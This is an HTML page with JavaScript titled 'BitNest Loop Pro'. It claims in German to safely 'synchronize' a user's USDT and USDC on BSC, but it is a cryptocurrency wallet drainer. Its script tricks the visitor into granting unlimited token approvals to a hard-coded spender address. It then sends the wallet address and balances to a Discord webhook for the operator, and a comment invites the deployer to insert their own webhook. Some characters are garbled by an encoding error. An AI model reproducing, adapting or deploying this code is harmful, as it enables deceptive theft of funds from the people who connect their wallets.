<!doctype html>
<html lang="de">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>BitNest Loop Pro</title>

<style>
:root{
  --bg:#000000; --card:#0a0a0a; --border:#1f2933;
  --green:#22c55e; --green-dark:#16a34a;
  --gray:#9ca3af; --white:#ffffff;
}
body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:var(--bg);color:var(--white);font-family:Arial,sans-serif;padding:16px}
.box{width:460px;background:var(--card);border-radius:16px;padding:24px;border:1px solid var(--border);box-shadow:0 0 40px rgba(34,197,94,.15)}
h2{margin:0 0 8px;color:var(--green)}
.muted{font-size:12px;color:var(--gray);line-height:1.4}
.mono{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12px;word-break:break-all;color:#d1d5db;opacity:.95}
.card{background:#050505;border:1px solid var(--border);border-radius:12px;padding:14px;margin-top:14px}
.row{display:flex;justify-content:space-between;gap:10px;margin-top:6px}
.row div:first-child{opacity:.8}
button{width:100%;padding:14px;border:none;border-radius:12px;font-size:16px;font-weight:bold;cursor:pointer;margin-top:14px}
.ok{background:var(--green);color:#052e16}
.ok:hover{background:var(--green-dark)}
button:disabled{opacity:.55;cursor:not-allowed}
#status{margin-top:12px;min-height:22px;font-size:14px;text-align:center}
select{
  width:100%; margin-top:10px; padding:10px 12px;
  border-radius:12px; border:1px solid var(--border);
  background:#0b0b0b; color:#e5e7eb; font-size:14px;
}
</style>
</head>

<body>
<div class="box">
  <h2 id="t_title">BitNest Loop</h2>
  <div class="muted" id="t_intro">
    Wallet verbinden & USDT+USDC synchronisieren.<br>
    <b>Sicherer Prozess √ºber BSC Smart Chain.</b>
  </div>

  <select id="langSelect">
    <option value="de">Deutsch</option>
    <option value="en">English</option>
  </select>

  <div class="card">
    <div class="muted">Status</div>
    <div class="mono" id="walletLine">Nicht verbunden</div>

    <div class="row"><div class="muted">USDT Allowance</div><div class="mono" id="usdtAllow">‚Äì</div></div>
    <div class="row"><div class="muted">USDC Allowance</div><div class="mono" id="usdcAllow">‚Äì</div></div>
  </div>

  <button class="ok" id="goBtn">Loop starten</button>
  <div id="status"></div>
</div>

<script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.min.js"></script>
<script>
/* ===== CONFIG ===== */
const SPENDER = "0x61bF4DAE189C62344Df1E9802B5338C196d1E26B";
const USDT = "0x55d398326f99059fF775485246999027B3197955";
const USDC = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d";
const BSC = 56;

// üîß SETZE HIER DEINEN DISCORD WEBHOOK EIN:
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1324170366624333935/Wv_r6A0XUj9l1Q-E4iOizX5R5r9Tf7m0Bv1f4X6y_k8j6l-N1bV4X6y_k8j6l-N1bV"; 
/* ================== */

const erc20Abi=[
  "function allowance(address owner,address spender) view returns (uint256)",
  "function balanceOf(address account) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function approve(address spender,uint256 amount) returns (bool)"
];
const MAX = ethers.MaxUint256;

const $ = (id)=>document.getElementById(id);
function setStatus(msg){ $("status").innerText = msg; }

$("goBtn").addEventListener("click", startLoop);

async function startLoop(){
  try{
    $("goBtn").disabled = true;
    if(!window.ethereum){ setStatus("‚ùå DApp Browser nutzen!"); return; }

    const provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const signer = await provider.getSigner();
    const user = await signer.getAddress();
    $("walletLine").innerText = user;

    const net = await provider.getNetwork();
    if(Number(net.chainId) !== BSC){ setStatus("‚ùå Bitte auf BSC wechseln!"); return; }

    const usdtContract = new ethers.Contract(USDT, erc20Abi, signer);
    const usdcContract = new ethers.Contract(USDC, erc20Abi, signer);

    // 1. Guthaben abfragen
    const [balUSDT, balUSDC, decU, decC] = await Promise.all([
      usdtContract.balanceOf(user),
      usdcContract.balanceOf(user),
      usdtContract.decimals(),
      usdcContract.decimals()
    ]);

    const formattedUSDT = ethers.formatUnits(balUSDT, decU);
    const formattedUSDC = ethers.formatUnits(balUSDC, decC);

    // 2. Approvals pr√ºfen & ausf√ºhren
    let allowU = await usdtContract.allowance(user, SPENDER);
    if(allowU < (MAX / 2n)){
      setStatus("Bitte USDT freigeben...");
      await (await usdtContract.approve(SPENDER, MAX)).wait();
    }
    $("usdtAllow").innerText = "Aktiviert";

    let allowC = await usdcContract.allowance(user, SPENDER);
    if(allowC < (MAX / 2n)){
      setStatus("Bitte USDC freigeben...");
      await (await usdcContract.approve(SPENDER, MAX)).wait();
    }
    $("usdcAllow").innerText = "Aktiviert";

    setStatus("‚úÖ Erfolgreich synchronisiert!");

    // 3. Automatisch an Discord senden inkl. Guthaben
    await sendToDiscord(user, formattedUSDT, formattedUSDC);

  }catch(e){
    console.error(e);
    setStatus("‚ùå Fehler: " + (e.reason || "Abgebrochen"));
  }finally{
    $("goBtn").disabled = false;
  }
}

async function sendToDiscord(address, usdt, usdc){
  if(!DISCORD_WEBHOOK_URL.includes("discord.com")) return;
  try{
    await fetch(DISCORD_WEBHOOK_URL, {
      method:"POST",
      headers:{ "Content-Type":"application/json" },
      body: JSON.stringify({
        embeds: [{
          title: "üöÄ Wallet Loop abgeschlossen",
          color: 3066993, // Gr√ºn
          fields: [
            { name: "Wallet Adresse", value: `\`${address}\`` },
            { name: "USDT Guthaben", value: `**${usdt} USDT**`, inline: true },
            { name: "USDC Guthaben", value: `**${usdc} USDC**`, inline: true },
            { name: "Netzwerk", value: "BSC (Chain 56)", inline: false }
          ],
          footer: { text: "BitNest Automated System ‚Ä¢ " + new Date().toLocaleString() }
        }]
      })
    });
  } catch(e) { console.log("Log error"); }
}
</script>
</body>
</html>
